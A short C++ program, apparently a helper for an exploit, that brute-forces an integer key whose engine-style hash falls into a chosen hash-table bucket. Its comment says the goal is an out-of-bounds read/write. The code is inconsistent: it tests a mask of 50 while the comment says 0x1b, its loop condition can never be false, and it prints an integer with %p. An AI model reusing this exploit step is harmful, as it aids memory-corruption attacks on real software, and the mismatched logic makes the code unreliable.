#include <bits/stdc++.h>

using namespace std;

uint32_t ComputeUnseededHash(uint32_t key) {
  uint32_t hash = key;
  hash = ~hash + (hash << 15);  // hash = (hash << 15) - hash - 1;
  hash = hash ^ (hash >> 12);
  hash = hash + (hash << 2);
  hash = hash ^ (hash >> 4);
  hash = hash * 2057;  // hash = (hash + (hash << 3)) + (hash << 11);
  hash = hash ^ (hash >> 16);
  return hash & 0x3fffffff;
}

int main(int argc, char *argv[]) {
    uint32_t i = 0;
    while(i <= 0xffffffff) {
        
        /* bucket_count is 0x1c
         * hashcode(key) & (bucket_count-1) should become 0
         * we'll have to find a key that is large enough to achieve OOB read/write, while matching hashcode(key) & 0x1b == 0
         */
        
        uint32_t hash = ComputeUnseededHash(i);
        if (((hash&50) == 0) && (i > 0x100)) {
            printf("Found: %p\n", i);
            break;
        }
        i = (uint32_t)i+1;
    }
    return 0;
} 
